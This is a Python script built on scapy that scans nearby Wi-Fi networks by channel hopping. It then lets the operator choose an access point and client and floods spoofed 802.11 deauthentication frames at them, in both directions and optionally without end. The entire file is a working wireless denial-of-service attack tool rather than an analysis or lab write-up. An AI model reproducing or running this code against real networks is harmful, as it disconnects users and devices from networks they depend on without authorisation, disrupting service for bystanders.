import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading

def add_network(pckt, known_networks):
    # Check to see if it's a hidden SSID (this could be resolved later using out Deauth attack)
    essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[Dot11Elt].info != '' else 'Hidden SSID'
    bssid = pckt[Dot11].addr3
    channel = int(ord(pckt[Dot11Elt:3].info))
    if bssid not in known_networks:
        known_networks[bssid] = ( essid, channel )
        print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)

def channel_hopper(interface):
    while True:
        try:
            channel = random.randrange(1,13)
            os.system("iwconfig %s channel %d" % (interface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break

def stop_channel_hop(signal, frame):
    global stop_sniff
    stop_sniff = True
    channel_hop.terminate()
    channel_hop.join()

def keep_sniffing(pckt):
    return stop_sniff

def perform_deauth(bssid, client, count):
    pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
    print 'Sending Deauth to ' + client + ' from ' + bssid
    if not count: print 'Press CTRL+C to quit'
    sys.stdout.write('Packets sent: ')
    sys.stdout.flush()
    # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
    while count != 0:
      try:
          for i in range(64):
              # Send out deauth from the AP
              send(pckt, verbose=0)
              # If we're targeting a client, we will also spoof deauth from the client to the AP
              if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt, verbose=0)
              sys.stdout.write('|')
              sys.stdout.flush()
          # If count was -1, this will be an infinite loop
          count -= 1
      except KeyboardInterrupt:
          break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for sniffing and packet injection')
    args = parser.parse_args()
    conf.iface = args.interface
    networks = {}
    stop_sniff = False
    print 'Press CTRL+c to stop sniffing..'
    print '='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100
    channel_hop = Process(target = channel_hopper, args=(args.interface,))
    channel_hop.start()
    # Sniff Beacon and Probe Response frames to extract AP info
    sniff( lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)),
         stop_filter=keep_sniffing,
         prn=lambda x: add_network(x,networks) )
    signal.signal(signal.SIGINT, stop_channel_hop)
    # ipdb.set_trace()
    # Reset our signal handler
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    target_bssid = raw_input('Enter a BSSID to perform an deauth attack (q to quit): ')
    while target_bssid not in networks:
        if target_bssid == 'q' : sys.exit(0)
        raw_input('BSSID not detected... Please enter another (q to quit): ')
    # Get our interface to the correct channel
    print 'Changing ' + args.interface + ' to channel ' + str(networks[target_bssid][1])
    os.system("iwconfig %s channel %d" % (args.interface, networks[target_bssid][1]))
    # Now we have a bssid that we have detected, let's get the client MAC
    target_client = raw_input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
    if not target_client: target_client = 'FF:FF:FF:FF:FF:FF'
    deauth_pckt_count = int(raw_input('Number of deauth packets (Default: -1 [constant]): '))
    if not deauth_pckt_count: deauth_pckt_count = -1
    perform_deauth(target_bssid, target_client, deauth_pckt_count)
